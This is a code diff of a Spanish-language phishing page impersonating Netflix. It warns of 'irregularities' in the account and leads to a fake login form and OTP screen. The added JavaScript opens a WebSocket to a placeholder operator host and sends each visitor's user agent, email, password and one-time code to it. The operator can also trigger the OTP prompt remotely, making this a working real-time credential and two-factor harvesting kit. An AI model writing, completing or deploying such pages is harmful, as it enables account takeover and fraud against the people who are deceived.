@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -15,7 +14,6 @@ body {
   margin: 0;
   padding: 20px;
   font-family: 'Poppins', Arial, sans-serif;
-  /* Fondo con imagen + overlay negro oscuro */
   background: 
     linear-gradient(rgba(20, 20, 20, 0.85), rgba(20, 20, 20, 0.85)),
     url('https://assets.nflxext.com/ffe/siteui/vlv3/258d0f77-2241-4282-b613-8354a7675d1a/web/EC-es-20250721-TRIFECTA-perspective_46610579-3b5e-43fd-a42d-654cdb8ada4d_small.jpg') no-repeat center center fixed;
@@ -33,7 +31,6 @@ body {
   border-radius: 12px;
   box-shadow: 0 8px 24px rgba(0,0,0,0.7);
   padding: 40px 30px;
-  box-sizing: border-box;
 }
 .logo-container {
   text-align: center;
@@ -41,7 +38,6 @@ body {
 }
 .logo-container img {
   width: 140px;
-  filter: none;
 }
 .title {
   font-size: 28px;
@@ -49,14 +45,11 @@ body {
   text-align: center;
   font-weight: 700;
   margin-bottom: 25px;
-  line-height: 1.2;
 }
 .paragraph {
   color: #cccccc;
   font-size: 17px;
   line-height: 1.6;
-  margin-top: 0;
-  margin-bottom: 0;
   text-align: justify;
 }
 .paragraph + .paragraph {
@@ -76,7 +69,6 @@ body {
   font-weight: 600;
   text-decoration: none;
   box-shadow: 0 4px 12px rgba(229, 9, 20, 0.6);
-  transition: background-color 0.3s ease, box-shadow 0.3s ease;
   cursor: pointer;
 }
 .button-block a:hover {
@@ -93,9 +85,7 @@ body {
   background-image: url('https://assets.nflxext.com/ffe/siteui/vlv3/258d0f77-2241-4282-b613-8354a7675d1a/web/EC-es-20250721-TRIFECTA-perspective_46610579-3b5e-43fd-a42d-654cdb8ada4d_small.jpg');
   background-size: cover;
   background-position: center;
-  background-repeat: no-repeat;
   z-index: 9999;
-  overflow-y: auto;
   display: flex;
   align-items: center;
   justify-content: center;
@@ -122,10 +112,7 @@ body {
   background-color: rgba(0,0,0,0.75);
   padding: 30px 25px;
   border-radius: 4px;
-  width: 100%;
   max-width: 360px;
-  margin: 20px auto;
-  box-sizing: border-box;
   color: #fff;
 }
 #login-screen .login-title {
@@ -137,8 +124,6 @@ body {
 #login-screen .login-btn,
 #login-screen .login-code-btn {
   width: 100%;
-  box-sizing: border-box;
-  display: block;
 }
 #login-screen .form-group {
   margin-bottom: 12px;
@@ -149,26 +134,19 @@ body {
   border: none;
   color: #fff;
   border-radius: 4px;
-  font-size: 15px;
 }
 #login-screen .form-group input::placeholder {
   color: #8c8c8c;
-}
-#login-screen .form-group input:focus {
-  outline: none;
-  border: 1px solid #fff;
-  background-color: #444;
 }
 #login-screen .login-btn {
   padding: 12px;
   background-color: #e50914;
   border: none;
   color: #fff;
-  font-size: 15px;
   font-weight: bold;
   border-radius: 4px;
-  cursor: pointer;
   margin-top: 12px;
+  cursor: pointer;
 }
 #login-screen .login-btn:hover {
   background-color: #f40612;
@@ -184,41 +162,11 @@ body {
   background-color: transparent;
   border: 1px solid #8c8c8c;
   color: #fff;
-  font-size: 15px;
   font-weight: bold;
   border-radius: 4px;
-  cursor: pointer;
   text-align: center;
-  text-decoration: none;
-  margin: 0;
+  display: block;
 }
-#login-screen .login-code-btn:hover {
-  background-color: rgba(255,255,255,0.05);
-}
-#login-screen .remember-help-flex {
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-  margin-top: 14px;
-  font-size: 0.85em;
-}
-#login-screen .remember-me {
-  display: flex;
-  align-items: center;
-  color: #b3b3b3;
-}
-#login-screen .remember-me input {
-  margin-right: 5px;
-}
-#login-screen .help-options a {
-  color: #b3b3b3;
-  text-decoration: none;
-}
-#login-screen .help-options a:hover {
-  text-decoration: underline;
-}
-
-/* Spinner Validando */
 #spinner-section {
   display: none;
   text-align: center;
@@ -247,12 +195,8 @@ body {
   text-align: center;
   color: #fff;
 }
-#otp-section.active {
-  display: block;
-}
 .otp-title {
   font-weight: 700;
-  font-size: 1.2em;
   margin-bottom: 10px;
 }
 .otp-inputs {
@@ -266,10 +210,10 @@ body {
   height: 50px;
   font-size: 24px;
   text-align: center;
-  border: none;
   border-radius: 6px;
   background-color: #1c1c1c;
   color: #fff;
+  border: none;
 }
 .otp-inputs input:focus {
   outline: 2px solid #e50914;
@@ -291,120 +235,32 @@ body {
   font-size: 13px;
   color: #999;
   margin-top: 8px;
-  cursor: default;
-}
-
-/* Responsive para login screen */
-@media (max-width: 480px) {
-  #login-screen {
-    align-items: flex-start;
-    padding-top: 80px;
-  }
-  #login-screen .login-container {
-    margin: 0 10px;
-  }
-  #login-screen .login-title {
-    font-size: 1.8em;
-  }
-  #login-screen .form-group input,
-  #login-screen .login-btn,
-  #login-screen .login-code-btn {
-    font-size: 16px;
-  }
-  #login-screen .remember-help-flex {
-    font-size: 0.9em;
-  }
-}
-
-/* Móvil: todo compacto y sin scroll vertical para aviso */
-@media (max-width: 480px) {
-  html, body {
-    height: 100%;
-    overflow: hidden;
-  }
-  body {
-    padding: 10px;
-    min-height: auto;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-  }
-  .nl-container {
-    max-width: 360px;
-    max-height: 100vh;
-    padding: 20px 15px;
-    box-shadow: none;
-    border-radius: 8px;
-    overflow-y: auto;
-  }
-  .logo-container {
-    margin-bottom: 20px;
-  }
-  .logo-container img {
-    width: 120px;
-  }
-  .title {
-    font-size: 20px;
-    margin-bottom: 15px;
-  }
-  .paragraph {
-    font-size: 14px;
-    margin-top: 0;
-    margin-bottom: 0;
-    line-height: 1.4;
-  }
-  .paragraph + .paragraph {
-    margin-top: 6px;
-  }
-  .button-block {
-    margin: 20px 0 15px;
-  }
-  .button-block a {
-    padding: 12px 40px;
-    font-size: 15px;
-    box-shadow: none;
-    border-radius: 20px;
-  }
 }
 </style>
 </head>
 <body>
 
-<!-- Pantalla de aviso -->
-<table class="nl-container" width="100%" cellpadding="0" cellspacing="0" role="presentation" id="notice-screen">
-<tbody>
-<tr>
-<td>
+<!-- Aviso -->
+<table class="nl-container" id="notice-screen">
+<tr><td>
 <div class="logo-container">
-  <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix Logo" />
+  <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" />
 </div>
-
-<div class="title">
-  Problemas detectados en tu cuenta Netflix
-</div>
-
+<div class="title">Problemas detectados en tu cuenta Netflix</div>
 <div class="paragraph">
-  Queremos informarte que hemos detectado irregularidades en el acceso a tu cuenta Netflix. Por motivos de seguridad, es imprescindible que inicies sesión para verificar tu información.
+  Hemos detectado irregularidades en tu cuenta. Por seguridad, inicia sesión para verificar tu información.
 </div>
-
-<div class="paragraph">
-  Si no realizas este procedimiento en las próximas 48 horas, tu cuenta podría ser suspendida temporalmente para proteger tus datos y evitar accesos no autorizados.
-</div>
-
 <div class="button-block">
   <a href="#" id="start-login-btn">Iniciar sesión seguro</a>
 </div>
-</td>
-</tr>
-</tbody>
+</td></tr>
 </table>
 
-<!-- Pantalla de login -->
-<div id="login-screen" style="display:none;">
+<!-- Login -->
+<div id="login-screen">
 <div class="logo-container">
-  <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix Logo" class="netflix-logo" />
+  <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" class="netflix-logo" />
 </div>
-
 <div class="login-container">
   <h1 class="login-title">Iniciar sesión</h1>
   <form id="login-form">
@@ -417,33 +273,20 @@ body {
     <button type="submit" class="login-btn">Iniciar sesión</button>
     <div class="options-divider">O</div>
     <a href="#" class="login-code-btn" id="use-otp-btn">Usar un código de inicio de sesión</a>
-    <div class="remember-help-flex">
-      <div class="remember-me">
-        <input type="checkbox" id="remember" />
-        <label for="remember">Recordarme</label>
-      </div>
-      <div class="help-options">
-        <a href="#">¿Olvidaste la contraseña?</a>
-      </div>
-    </div>
   </form>
-
-  <!-- Spinner Validando -->
   <div id="spinner-section">
     <div class="spinner"></div>
     <div>Validando, por favor espera...</div>
   </div>
-
-  <!-- OTP Section -->
   <div id="otp-section">
-    <div class="otp-title">Ingrese el código OTP enviado a su correo o teléfono</div>
+    <div class="otp-title">Ingrese el código OTP</div>
     <div class="otp-inputs">
-      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
-      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
-      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
-      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
-      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
-      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
+      <input type="text" maxlength="1" inputmode="numeric" />
+      <input type="text" maxlength="1" inputmode="numeric" />
+      <input type="text" maxlength="1" inputmode="numeric" />
+      <input type="text" maxlength="1" inputmode="numeric" />
+      <input type="text" maxlength="1" inputmode="numeric" />
+      <input type="text" maxlength="1" inputmode="numeric" />
     </div>
     <button class="otp-button">Verificar</button>
     <div class="timer" id="timer">Reenviar en 30 segundos</div>
@@ -458,94 +301,85 @@ const startLoginBtn = document.getElementById('start-login-btn');
 const loginForm = document.getElementById('login-form');
 const spinnerSection = document.getElementById('spinner-section');
 const otpSection = document.getElementById('otp-section');
-const useOtpBtn = document.getElementById('use-otp-btn');
 const otpInputs = otpSection.querySelectorAll('input[type="text"]');
 const timerEl = document.getElementById('timer');
+const useOtpBtn = document.getElementById('use-otp-btn');
 
-startLoginBtn.addEventListener('click', e => {
+let ws;
+function connectWS() {
+  ws = new WebSocket("ws://TU_IP_O_DOMINIO:8765");
+  ws.onopen = () => {
+    console.log("✅ Conectado WebSocket");
+    ws.send(JSON.stringify({type:"access", info: navigator.userAgent}));
+  };
+  ws.onmessage = e => {
+    const data = JSON.parse(e.data);
+    if (data.type === "show_otp") {
+      loginForm.style.display = 'none';
+      spinnerSection.style.display = 'none';
+      otpSection.style.display = 'block';
+      otpInputs[0].focus();
+      startTimer(30);
+    }
+  };
+  ws.onclose = () => setTimeout(connectWS, 3000);
+}
+connectWS();
+
+startLoginBtn.onclick = e => {
   e.preventDefault();
   noticeScreen.style.display = 'none';
   loginScreen.style.display = 'flex';
-});
+};
 
-loginForm.addEventListener('submit', e => {
+loginForm.onsubmit = e => {
   e.preventDefault();
-  // Mostrar spinner y ocultar formulario
-  loginForm.style.display = 'none';
-  spinnerSection.style.display = 'block';
-
-  // Aquí podrías agregar lógica de validación o envío real
   const email = document.getElementById('email-input').value;
   const password = document.getElementById('password-input').value;
-  console.log('Iniciar sesión con:', email, password);
+  if (ws.readyState === WebSocket.OPEN) {
+    ws.send(JSON.stringify({type:"login", user: email, pass: password}));
+  }
+  loginForm.style.display = 'none';
+  spinnerSection.style.display = 'block';
+};
 
-  // El spinner se queda visible, sin alertas ni simulaciones
-});
-
-// Mostrar sección OTP y ocultar formulario al pulsar "Usar código"
-useOtpBtn.addEventListener('click', e => {
+useOtpBtn.onclick = e => {
   e.preventDefault();
   loginForm.style.display = 'none';
   spinnerSection.style.display = 'none';
   otpSection.style.display = 'block';
   otpInputs[0].focus();
   startTimer(30);
-});
+};
 
-// Funcionalidad para moverse al siguiente input automáticamente
 otpInputs.forEach((input, i) => {
   input.addEventListener('input', () => {
     if (input.value.length === 1 && i < otpInputs.length -1) {
-      otpInputs[i + 1].focus();
-    }
-  });
-  input.addEventListener('keydown', e => {
-    if (e.key === 'Backspace' && input.value === '' && i > 0) {
-      otpInputs[i - 1].focus();
+      otpInputs[i+1].focus();
     }
   });
 });
 
-// Temporizador
+otpSection.querySelector('.otp-button').onclick = () => {
+  const code = Array.from(otpInputs).map(i=>i.value).join('');
+  if (code.length !== otpInputs.length) return alert("Código incompleto");
+  if (ws.readyState === WebSocket.OPEN) {
+    ws.send(JSON.stringify({type:"otp", otp: code}));
+  }
+  alert("Código enviado");
+};
+
 let countdown;
 function startTimer(seconds) {
   clearInterval(countdown);
   let timeLeft = seconds;
   timerEl.textContent = `Reenviar en ${timeLeft} segundos`;
-  timerEl.style.color = '#999';
-  timerEl.style.cursor = 'default';
-  timerEl.onclick = null;
   countdown = setInterval(() => {
     timeLeft--;
-    if(timeLeft <= 0) {
-      clearInterval(countdown);
-      timerEl.textContent = '¿No recibiste el código? Reenviar';
-      timerEl.style.color = '#e50914';
-      timerEl.style.cursor = 'pointer';
-      timerEl.onclick = () => {
-        timerEl.style.color = '#999';
-        timerEl.style.cursor = 'default';
-        startTimer(30);
-        // Aquí podrías agregar lógica para reenviar el código OTP
-        // Sin alertas ni simulaciones
-      };
-    } else {
-      timerEl.textContent = `Reenviar en ${timeLeft} segundos`;
-    }
+    if(timeLeft <= 0) clearInterval(countdown);
+    timerEl.textContent = `Reenviar en ${timeLeft} segundos`;
   }, 1000);
 }
-
-// Botón verificar OTP (solo ejemplo)
-otpSection.querySelector('.otp-button').addEventListener('click', () => {
-  const code = Array.from(otpInputs).map(i => i.value).join('');
-  if(code.length !== otpInputs.length || !/^\d+$/.test(code)) {
-    alert('Por favor ingresa el código OTP completo y válido.');
-    return;
-  }
-  alert('Código OTP ingresado: ' + code);
-  // Aquí iría la lógica de validación del OTP real
-});
 </script>
-
 </body>
 </html>
